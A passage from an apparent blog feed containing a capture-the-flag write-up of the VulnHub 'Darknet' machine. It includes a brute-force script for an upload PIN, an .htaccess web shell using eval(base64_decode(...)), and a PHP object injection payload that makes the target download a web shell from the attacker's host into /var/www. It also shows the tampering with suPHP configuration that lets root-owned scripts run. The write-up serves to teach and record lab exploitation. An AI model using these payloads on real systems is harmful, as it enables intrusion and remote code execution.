+&lt;p&gt;It very quickly became obvious that you have to select the right combination of checkboxes in order to be allowed to upload anything. Each checkbox had a numeric value, so I copied this out into a script and proceeded to try all of the combinations possible. I knew a combination was correct if the Spanish term &lt;em&gt;Key incorrecta!&lt;/em&gt; was not in the response. With some manual fiddling, I also learnt that the key was 4 integers long. Attempting a combination with more or less than 4 keys meant that the HTTP response had &lt;em&gt;La longitud de la clave no es la correcta!&lt;/em&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;import requests
+import itertools
+import sys
+
+VALUES = [37, 12, 59, 58, 72, 17, 22, 10, 99]
+PIN = None
+
+s = requests.Session()
+
+
+def w(text):
+    sys.stdout.write(&#39;\r&#39; + text)
+    sys.stdout.flush()
+
+
+# Need a valid session before we can continue.
+print(&#39;[+] Logging in&#39;)
+s.post(&#39;http://signal8.darknet.com/xpanel/index.php&#39;, data={
+    &#39;username&#39;: &#39;errorlevel&#39;,
+    &#39;password&#39;: &#39;tc65Igkq6DF&#39;,
+})
+
+print(&#39;[+] Bruting PIN Code ...&#39;)
+for c in itertools.permutations(VALUES, 4):
+    w(&amp;quot;{pin}&amp;quot;.format(pin=&#39;, &#39;.join(map(str, c))))
+    r = s.post(&#39;http://signal8.darknet.com/xpanel/ploy.php&#39;,
+               files={&#39;imag&#39;: open(&#39;test_image.png&#39;, &#39;rb&#39;)},
+               data={
+                   &#39;checkbox[]&#39;: c,
+                   &#39;Action&#39;: &#39;Upload&#39;,
+               })
+
+    if &#39;incorrecta&#39; not in r.text:
+        print(&#39;\n[+] Found pin: {pin}&#39;.format(pin=&#39;, &#39;.join(map(str, c))))
+        break
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Seeing this script in action would look as follows:
+&lt;script type=&#34;text/javascript&#34; src=&#34;https://asciinema.org/a/13eq1usld7zxx2yoj55khbhwp.js&#34; id=&#34;asciicast-13eq1usld7zxx2yoj55khbhwp&#34; async&gt;&lt;/script&gt;&lt;/p&gt;
+
+&lt;p&gt;So the pin code was &lt;code&gt;37, 10, 59, 17&lt;/code&gt;. Easy.&lt;/p&gt;
+
+&lt;p&gt;The next obvious step was to try and figure out how we can weaponize this file upload, if at all. The file upload appeared to accept most uploads except for those ending in .php. Uploading a PHP script would return the error &lt;em&gt;Formato invalido!&lt;/em&gt; Things like images (or almost anything that was not useful) responded with &lt;em&gt;Subida exitosa!&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;I managed to discover a &lt;code&gt;uploads/&lt;/code&gt; directory with &lt;code&gt;gobuster&lt;/code&gt; again that helped me locate the uploaded files that I was uploading. The filenames appeared to remain intact which made things a little easier. But, this did not help me. I really hoped for some code execution.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;fast forward even more hours&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Eventually, I came across some PHP file upload bypass techniques that involve &lt;code&gt;.htaccess&lt;/code&gt; files. The premise being that if its possible to write/overwrite a folders &lt;code&gt;.htaccess&lt;/code&gt;, then it may be possible to &lt;a href=&#34;http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html&#34;&gt;add a tiny backdoor shell&lt;/a&gt; to a folder. Sneaky! The only real requirement was that the VirtualHost configuration had to allow for &lt;code&gt;.htaccess&lt;/code&gt; files to be read. As I had already downloaded the configuration file for signal8.darknet.com, I could quickly see that &lt;code&gt;AllowOverride&lt;/code&gt; was set to &lt;code&gt;All&lt;/code&gt;. Fantastic!&lt;/p&gt;
+
+&lt;p&gt;I picked a shell from the &lt;a href=&#34;https://github.com/wireghoul/htshells&#34;&gt;https://github.com/wireghoul/htshells&lt;/a&gt; repository &lt;a href=&#34;https://github.com/wireghoul/htshells/blob/master/shell/mod_php.shell.htaccess&#34;&gt;here&lt;/a&gt;. From my previous testing, I wrote a small uploader so that I wouldn&amp;rsquo;t have to click those checkboxes all the time.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;import requests
+import sys
+import os.path as path
+
+s = requests.Session()
+
+
+def w(text):
+    sys.stdout.write(&#39;\r&#39; + text)
+    sys.stdout.flush()
+
+
+print(&#39;[+] Logging in ...&#39;)
+s.post(&#39;http://signal8.darknet.com/xpanel/index.php&#39;, data={
+    &#39;username&#39;: &#39;errorlevel&#39;,
+    &#39;password&#39;: &#39;tc65Igkq6DF&#39;,
+})
+
+print(&#39;[+] Uploading : {file}&#39;.format(file=sys.argv[1]))
+r = s.post(&#39;http://signal8.darknet.com/xpanel/ploy.php&#39;,
+           files={&#39;imag&#39;: open(sys.argv[1], &#39;rb&#39;)},
+           data={
+               &#39;checkbox[]&#39;: [37, 10, 59, 17],
+               &#39;Action&#39;: &#39;Upload&#39;,
+           })
+
+if &#39;Subida exitosa&#39; in r.text:
+    print(&#39;[+] Upload successful! Try: http://signal8.darknet&#39;
+          &#39;.com/xpanel/uploads/{file}&#39;.format(file=path.basename(sys.argv[1])))
+elif &#39;Formato invalido&#39; in r.text:
+    print(&#39;[!] Upload failed. Invalid format.&#39;)
+else:
+    print(&#39;[!] Upload failed, unknown error.&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;All I had to do was runt his script, providing the filename that I want to upload and viola.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~/data/VulnHub/Darknet# python bruteUploader.py .htaccess
+[+] Logging in ...
+[+] Uploading : .htaccess
+[+] Upload successful! Try: http://signal8.darknet.com/xpanel/uploads/.htaccess
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Once uploaded, I browsed to the location and was met with what looks like some code execution again!&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_shell.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;As expected, the OS command execution does not work due to all those &lt;code&gt;disable_functions&lt;/code&gt;, but we have PHP code execution so that was a start! I decided that for this one I wanted to try get a more fully featured shell working. So, I edited the &lt;code&gt;.htaccess&lt;/code&gt; to include a web shell that &lt;a href=&#34;https://gist.github.com/leonjza/8e9d16c84cf70014c4f36d8f95f9836e&#34;&gt;I was working quite some time ago&lt;/a&gt; (and finally kinda finished). I packed the shell and replaced the PHP in the &lt;code&gt;.htaccess&lt;/code&gt; with the more fully featured shells packed source.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# &amp;lt;!--  Self contained .htaccess web shell - Part of the htshell project
+# Written by Wireghoul - http://www.justanotherhacker.com
+
+# Override default deny rule to make .htaccess file accessible over web
+&amp;lt;Files ~ &amp;quot;^\.ht&amp;quot;&amp;gt;
+# Uncomment the line below for Apache2.4 and newer
+# Require all granted
+    Order allow,deny
+    Allow from all
+&amp;lt;/Files&amp;gt;
+
+# Make .htaccess file be interpreted as php file. This occur after apache has interpreted
+# the apache directoves from the .htaccess file
+AddType application/x-httpd-php .htaccess
+
+###### SHELL ###### --&amp;gt;&amp;lt;?php eval(base64_decode(&amp;quot;LONG BASE64 ENCODED STRING&amp;quot;));
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Uploaded this with my upload helper and boom, a better shell.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_shell2.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;the-last-hurdle-s&#34;&gt;the last hurdle(s)&lt;/h2&gt;
+
+&lt;p&gt;Wtf. The current user is &lt;code&gt;errorlevel&lt;/code&gt;&amp;hellip; I double checked and saw that previously we were the &lt;code&gt;devnull&lt;/code&gt; user. This had me pretty confused in the beginning and had me spend quite a bit of time to figure out how this is possible. From the &lt;code&gt;phpinfo()&lt;/code&gt; output we had no &lt;code&gt;open_basedir&lt;/code&gt; restriction so that allowed me to move around the filesystem much more freely than before. I also noticed that I am not able to access the home directory for the &lt;code&gt;errorlevel&lt;/code&gt; user so I couldn&amp;rsquo;t really figure out what was going on in there (the red color indicates read/write is not possible).&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_homedirs.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Eventually, I discovered the use of &lt;a href=&#34;http://www.suphp.org/&#34;&gt;suPHP&lt;/a&gt; as a loaded module. This basically means that the PHP script will run as the owner of the file. So with that theory, its sane to assume that because &lt;code&gt;errorlevel&lt;/code&gt; owns the PHP files in the users home directory, that is why I am seen as that user too.&lt;/p&gt;
+
+&lt;p&gt;Anyways, some more enumeration later, I discover some more PHP scripts in &lt;code&gt;/var/www&lt;/code&gt;. These were owned by &lt;code&gt;root&lt;/code&gt;, meaning that if there are any vulnerabilities, I could effectively become root!&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_var_www.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Due to the fact that these were in &lt;code&gt;/var/www&lt;/code&gt;, I could just browse to the IP address of the VM and run these scripts. Calling the &lt;code&gt;sec.php&lt;/code&gt; script caused the server to return an HTTP 500 error.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_sec_error.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;As I was able to read the files in &lt;code&gt;/var/www&lt;/code&gt;, I also downloaded &lt;code&gt;sec.php&lt;/code&gt; to get an idea of what its supposed to be doing.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+
+require &amp;quot;Classes/Test.php&amp;quot;;
+require &amp;quot;Classes/Show.php&amp;quot;;
+
+if(!empty($_POST[&#39;test&#39;])){
+    $d=$_POST[&#39;test&#39;];
+    $j=unserialize($d);
+    echo $j;
+}
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The call to &lt;code&gt;unserialize()&lt;/code&gt; immediately hinted me towards what the next step would need to be. I continued to download the files that are required in the &lt;code&gt;Classes/&lt;/code&gt; folder.&lt;/p&gt;
+
+&lt;p&gt;Test.php&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+
+class Test {
+
+    public $url;
+    public $name_file;
+    public $path;
+
+    function __destruct(){
+        $data=file_get_contents($this-&amp;gt;url);
+        $f=fopen($this-&amp;gt;path.&amp;quot;/&amp;quot;.$this-&amp;gt;name_file, &amp;quot;w&amp;quot;);
+        fwrite($f, $data);
+        fclose($f);
+        chmod($this-&amp;gt;path.&amp;quot;/&amp;quot;.$this-&amp;gt;name_file, 0644);
+}
+}
+
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Show.php&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+
+class Show {
+
+    public $woot;
+
+    function __toString(){
+        return &amp;quot;Showme&amp;quot;;        
+
+}
+    function Pwnme(){
+        $this-&amp;gt;woot=&amp;quot;ROOT&amp;quot;;
+
+}
+
+}
+
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;A textbook example of &lt;a href=&#34;https://www.owasp.org/index.php/PHP_Object_Injection&#34;&gt;PHP Object Injection&lt;/a&gt;! I continued to serialize an instance of of the &lt;code&gt;Show&lt;/code&gt; class by copying the class into a new PHP file, instantiating the &lt;code&gt;Show&lt;/code&gt; class and running the &lt;code&gt;serialize()&lt;/code&gt; function over it, printing the output.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;// Source code for poishow.php
+&amp;lt;?php
+
+class Show {
+
+    public $woot;
+
+    function __toString(){
+        return &amp;quot;Showme&amp;quot;;
+
+}
+    function Pwnme(){
+        $this-&amp;gt;woot=&amp;quot;ROOT&amp;quot;;
+
+}
+
+}
+
+print_r(serialize(new Show()));
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Running this with a PHP interpreter printed the serialized string.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~/data/VulnHub/Darknet# php poishow.php
+O:4:&amp;quot;Show&amp;quot;:1:{s:4:&amp;quot;woot&amp;quot;;N;}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I now had something I could use to try and test the vulnerability. For the &lt;code&gt;Show&lt;/code&gt; class, we are going to leverage the &lt;code&gt;__toString()&lt;/code&gt; method defined when &lt;code&gt;sec.php&lt;/code&gt; calls &lt;code&gt;echo&lt;/code&gt; on the variable containing the unserialized object. I write &lt;em&gt;yet another python helper&lt;/em&gt; to send the serialized objects to the &lt;code&gt;sec.php&lt;/code&gt; as a POST parameter. This was mostly because I was too lazy to deal with my shell and escaping the quotes etc. :)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;import requests
+
+OBJECT = &amp;quot;&amp;quot;&amp;quot;O:4:&amp;quot;Show&amp;quot;:1:{s:4:&amp;quot;woot&amp;quot;;N;}&amp;quot;&amp;quot;&amp;quot;
+
+print(&#39;[+] Exploiting the PHP Object Injection Bug&#39;)
+r = requests.post(&#39;http://192.168.252.140/sec.php&#39;, data={&#39;test&#39;: OBJECT})
+print r.status_code
+print r.text
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Running this made the server still respond with an HTTP 500 error. Hmm. I was stuck here for quite some time trying to figure out if I can get some form of logging somewhere that I can read. At some stage, I came across &lt;code&gt;/etc/suphp&lt;/code&gt; and realized that the configuration file for it is writable.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_suphp_writable.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;The &lt;code&gt;suphp.conf&lt;/code&gt; file had an entry &lt;code&gt;logfile=/var/log/suphp/suphp.log&lt;/code&gt; which I changed to log to &lt;code&gt;/tmp&lt;/code&gt;, hoping for it to reveal some information about the error code I was getting. To do this, I downloaded the file, modified the entry, and used my web shell&amp;rsquo;s upload functionality to override the original configuration file. This worked just fine, apart from the fact that that logfile too was not readable by me :(&lt;/p&gt;
+
+&lt;p&gt;Some time later, I realized that there were two more configuration options in the configuration file that are of interest.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;; Minimum UID
+min_uid=100
+
+; Minimum GID
+min_gid=100
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Remember that the PHP scripts we are trying to access are owned by &lt;code&gt;root&lt;/code&gt;? Turns out that this is a security feature of &lt;a href=&#34;http://www.suphp.org/&#34;&gt;suPHP&lt;/a&gt; to prevent scripts with too high permissions to run. So, I modify the configuration file again to replace the values with &lt;code&gt;0&lt;/code&gt; and upload it to override the original.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_suphp_override.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;This time, when I try and access the &lt;code&gt;sec.php&lt;/code&gt; script, I am provided with no output. Great! Back to the original Object Injection that I was trying to exploit, I rerun my python script to test the &lt;code&gt;unserialize()&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~/data/VulnHub/Darknet# python phpObjectInjection.py
+[+] Exploiting the PHP Object Injection Bug
+200
+Showme
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The &lt;code&gt;Showme&lt;/code&gt; output is expected as the &lt;code&gt;__toString()&lt;/code&gt; method is set to return this when the class should be represented as a string. Neat.&lt;/p&gt;
+
+&lt;p&gt;The next step was then to serialize an object with my desired values for the &lt;code&gt;Test&lt;/code&gt; class&amp;rsquo;s properties. Following the logic of the &lt;code&gt;__destruct()&lt;/code&gt; method, it was clear to see that it would call a URL, write the contents to file and chmod the file accordingly. To do this, I added the &lt;code&gt;Test&lt;/code&gt; class and set the values in my original script.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+
+class Show {
+
+    public $woot;
+
+    function __toString(){
+        return &amp;quot;Showme&amp;quot;;
+
+}
+    function Pwnme(){
+        $this-&amp;gt;woot=&amp;quot;ROOT&amp;quot;;
+
+}
+
+}
+
+class Test {
+
+    public $url;
+    public $name_file;
+    public $path;
+
+    function __destruct(){
+        # Commented out as this will run when this script
+        # also finishes :D
+
+        #$data=file_get_contents($this-&amp;gt;url);
+        #$f=fopen($this-&amp;gt;path.&amp;quot;/&amp;quot;.$this-&amp;gt;name_file, &amp;quot;w&amp;quot;);
+        #fwrite($f, $data);
+        #fclose($f);
+        #chmod($this-&amp;gt;path.&amp;quot;/&amp;quot;.$this-&amp;gt;name_file, 0644);
+}
+}
+
+
+$test = new Test();
+$test-&amp;gt;url = &#39;http://192.168.252.1:8000/shell.txt&#39;;
+$test-&amp;gt;name_file = &#39;pop.php&#39;;
+$test-&amp;gt;path = &#39;/var/www&#39;;
+
+print_r(serialize([$test, new Show()]));
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Running this would then print out the serialized versions of the two classes in question.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~/data/VulnHub/Darknet# php poi.php
+a:2:{i:0;O:4:&amp;quot;Test&amp;quot;:3:{s:3:&amp;quot;url&amp;quot;;s:35:&amp;quot;http://192.168.252.1:8000/shell.txt&amp;quot;;s:9:&amp;quot;name_file&amp;quot;;s:7:&amp;quot;pop.php&amp;quot;;s:4:&amp;quot;path&amp;quot;;s:8:&amp;quot;/var/www&amp;quot;;}i:1;O:4:&amp;quot;Show&amp;quot;:1:{s:4:&amp;quot;woot&amp;quot;;N;}}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The only thing that is left to do is host the &lt;code&gt;shell.txt&lt;/code&gt; file at the location specified in the &lt;code&gt;$url&lt;/code&gt; property and run the little python helper with the new serialized string. I started up a HTTP server with &lt;code&gt;python -m SimpleHTTPServer&lt;/code&gt; and wrote my web shell to &lt;code&gt;shell.txt&lt;/code&gt;. The python helper was changed so that &lt;code&gt;OBJECT&lt;/code&gt; had the new serialized string.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;OBJECT = &amp;quot;&amp;quot;&amp;quot;a:2:{i:0;O:4:&amp;quot;Test&amp;quot;:3:{s:3:&amp;quot;url&amp;quot;;s:35:&amp;quot;http://192.168.252.1:8000/shell.txt&amp;quot;;s:9:&amp;quot;name_file&amp;quot;;s:7:&amp;quot;pop.php&amp;quot;;s:4:&amp;quot;path&amp;quot;;s:8:&amp;quot;/var/www&amp;quot;;}i:1;O:4:&amp;quot;Show&amp;quot;:1:{s:4:&amp;quot;woot&amp;quot;;N;}}&amp;quot;&amp;quot;&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I ran the helper and saw that the &lt;code&gt;shell.txt&lt;/code&gt; was downloaded from my web server. I could now browse to &lt;a href=&#34;http://192.168.252.140/pop.php&#34;&gt;http://192.168.252.140/pop.php&lt;/a&gt; :D&lt;/p&gt;
+
+&lt;h2 id=&#34;flag&#34;&gt;flag&lt;/h2&gt;
+
+&lt;p&gt;Using the shell uploaded, I was finally able to cat the flag!&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_flag.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;final-thoughts&#34;&gt;final thoughts&lt;/h2&gt;
+
+&lt;p&gt;I went back to a few of the source files to get an idea for whats going on once the box was rooted. The first being the weirdness when I tried to brute force the first elements of the node in the XPath injection. Turns out, a &lt;code&gt;preg_match()&lt;/code&gt; was applied to filter out a few inputs.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;if(!empty($_GET[&#39;id&#39;])){
+    $id=$_GET[&#39;id&#39;];
+    if(preg_match(&#39;/\*/&#39;, $id)){
+        exit();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Next, the original SQL injection bug was also filtering out some input.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;if(preg_match(&amp;quot;/select|and|[&amp;gt;,=&amp;lt;\-;]/&amp;quot;, $user)){
+    echo &amp;quot;Ilegal&amp;quot;;
+    exit();
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In the end, I learnt a lot! Thanks &lt;a href=&#34;https://twitter.com/Q3rv0&#34;&gt;@Q3rv0&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>beating sokar the vulnhub turns 0b10 challenge</title>
